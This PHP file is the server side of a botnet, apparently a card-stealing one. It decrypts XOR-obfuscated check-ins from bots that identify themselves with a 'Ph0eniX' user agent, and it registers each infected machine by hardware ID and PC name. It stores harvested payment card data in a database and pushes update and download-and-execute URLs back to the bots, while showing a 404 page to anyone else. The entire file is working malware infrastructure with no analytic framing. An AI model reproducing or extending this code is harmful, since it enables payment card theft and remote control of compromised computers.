<?php
	require_once('config.php');
		
	define('HEADER_SIZE', 76);
	define('SIG_SIZE', 72);
	$outkey = '';
	
	function cxor($data, $offset, $length, $key, $klen)
	{
		$ret = "";
		for ($i = 0; $i < $length; $i++)
			$ret .= chr(ord($data[$offset + $i]) ^ ord($key[$i % $klen]));
		return $ret;
	}
	
	function match_sig($data, $rsig)
	{
		$sig = "\x34\xde\x12\xab";
		for ($i = 0; $i < SIG_SIZE; $i++) {
			$c = ord($data[$i]);
			$current = ord($sig[$c % 4]);
			$sig[$c % 4] = chr($current + $c + ($c % 27));
		}
		
		for ($i = 0; $i < 4; $i++)
			if (ord($sig[$i]) !== ord($rsig[$i]))
				return(false);
				
		return(true);
	}
	
	function parse_input()
	{
		global $outkey;
		ob_start();
		
		$data = file_get_contents("php://input");
		if (strlen($data) < HEADER_SIZE)
			return false;
			
		$key = '';
		for ($i = 0; $i < 18; $i++)
			$key .= $data[18 + $i];
		
		$data = cxor($data, 0, strlen($data), "\xaa", 1);
		
		for ($i = 0; $i < 18; $i++)
			$outkey .= $data[18 + $i];
		$header = unpack("Sv/a16sv/a8hwid/C2n/a8act/a32pcn/Lsize/C4s", $data);

		if ($header === false)
			return(false);
		
		if (!match_sig($data, chr($header['s1']) . chr($header['s2']) . chr($header['s3']) . chr($header['s4'])))
			return(false);
			
		$length = $header['size'] - 123;
		if ($length + HEADER_SIZE !== strlen($data))
			return(false);
		
		$ret = array('nversion' => $header['v'],
			'version' => $header['sv'],
			'hwid' => $header['hwid'],
			'action' => $header['act'],
			'pcname' => $header['pcn']);
			
		if ($length) {
			$body = cxor($data, HEADER_SIZE, $length, $key, 18);
			$params = explode("&", $body);

			if (!empty($params))
				foreach ($params as $p) {
					if (!strlen($p))
						continue;
						
					$v = explode("=", $p);
					if (empty($v))
						continue;
						
					if (isset($ret[$v[0]])) {
						if (!is_array($ret[$v[0]]))
							$ret[$v[0]] = array($ret[$v[0]]);
						array_push($ret[$v[0]], urldecode($v[1]));
					} else
						$ret[$v[0]] = urldecode($v[1]);
				}
		}
		
		return($ret);
	}
	
	function putout()
	{
		global $outkey;
		
		$out = ob_get_contents();
		ob_end_clean();
		
		header('HTTP/1.1 ' . 666 . ' OK');
		header('Status: ' . 666 . ' OK');
		print cxor($out, 0, strlen($out), $outkey, 18);
	}
	
	$params = parse_input();

	if ($params === false || substr($_SERVER['HTTP_USER_AGENT'], 0, 7) !== 'Ph0eniX') {
		header('Status: 404 Not Found');
		header('HTTP/1.1 404 Not Found');
		exit();
	}
	
	$ip = $_SERVER['REMOTE_ADDR'];
	$hwid = mysql_real_escape_string(@$params['hwid']);
	$pcn = mysql_real_escape_string(@$params['pcname']);
	$version = mysql_real_escape_string(@$params['version']);
	
	$date = time();
	$ua = mysql_real_escape_string($_SERVER['HTTP_USER_AGENT']);
		
	if (@$params['action'] === 'update') {
		$row = mysql_fetch_assoc(mysql_query("SELECT url FROM version WHERE ver='$version'"));
		if ($row !== false && strlen($row[url]) > 7)
			$update = "update=$row[url]|";
		else
			$update = '';
			
		$ui = $GLOBALS['updateinterval'];
		$ci = $GLOBALS['cardinterval'];
		print "updateinterval=$ui,$update,cardinterval=$ci";
	} 
	if (@$params['action'] === 'diag' || (@$params['action'] === 'update' && !empty($params['diag']))) {
		$log = mysql_real_escape_string($params['diag']);
		$sql = "INSERT INTO logs(ip, hwid, date, data, ua, pcn) VALUES ('$ip', '$hwid', '$date', '$log', '$ua', '$pcn')";
		mysql_query($sql);
	} else if (@$params['action'] === 'cards') {
		if (count($params['card'])) {
			$sql = "INSERT INTO cards(ip, hwid, date, card, ua, pcn) VALUES";
			
			if (is_array($params['card']))
				foreach ($params['card'] as $card) {
					if (empty($card))
						continue;
						
					$card = mysql_real_escape_string($card);
					$sql .= "('$ip', '$hwid', $date, '$card', '$ua', '$pcn'),";
				}
			else {
				$card = mysql_real_escape_string($params['card']);
				$sql .= "('$ip', '$hwid', $date, '$card', '$ua', '$pcn'),";
			}
			
			$sql = substr($sql, 0, strlen($sql) - 1);
			mysql_query($sql);
		}
	}
	
	$r = mysql_query("SELECT id FROM bots WHERE hwid='$hwid' AND pcn='$pcn' LIMIT 1");
	if (!mysql_num_rows($r)) {
		mysql_query("INSERT INTO bots(lastip, hwid, pcn, version, seen) VALUES('$ip', '$hwid', '$pcn', '$version', '$date')");
		$bid = mysql_insert_id();
	} else {
		mysql_query("UPDATE bots SET lastip='$ip', version='$version', seen='$date' WHERE hwid='$hwid' AND pcn='$pcn' LIMIT 1");		
		$bid = (int)mysql_fetch_array($r)[0];
	}
	
	$r = mysql_query("SELECT id, url FROM dl");
	if (mysql_num_rows($r)) {
		$a = mysql_fetch_array($r);
		$jid = $a[0];
		$url = $a[1];
		
		if (!mysql_num_rows(mysql_query("SELECT id FROM jobs WHERE jobid='$jid' AND botid='$bid'"))) {
			mysql_query("INSERT INTO jobs(jobid, botid) VALUES($jid, $bid)");
			print ",dlex=$url|";
		}
	}
	
	
	header('HTTP/1.1 ' . $GLOBALS['successcode'] . ' OK');
	header('Status: ' . $GLOBALS['successcode'] . ' OK');
	
	putout();
?>
